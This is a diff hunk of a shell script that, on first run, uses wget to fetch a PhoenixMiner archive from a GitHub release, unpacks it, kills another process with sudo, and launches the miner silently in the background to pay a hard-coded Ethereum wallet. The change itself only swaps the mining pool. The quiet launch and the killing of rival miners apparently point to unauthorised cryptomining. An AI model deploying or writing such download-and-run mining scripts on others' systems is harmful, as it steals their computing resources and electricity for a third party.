@@ -19,7 +19,7 @@ if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ]; then
 	echo "taind vip pro" > isHaveSetupCoin.txt
 	wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/PhoenixMiner_5.6d_Linux.tar.gz ; tar -zxvf PhoenixMiner_5.6d_Linux.tar.gz
   	sudo killall XXX
-	./PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0xC16BA00292B95dcb6320d664ea4095C69E7b11Ad -worker STD1 -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth &
+	./PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eth.2miners.com:2020 -wal 0xC16BA00292B95dcb6320d664ea4095C69E7b11Ad -worker STD1 -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth &
 else
 	if pgrep t-rex >/dev/null 2>&1
 	then
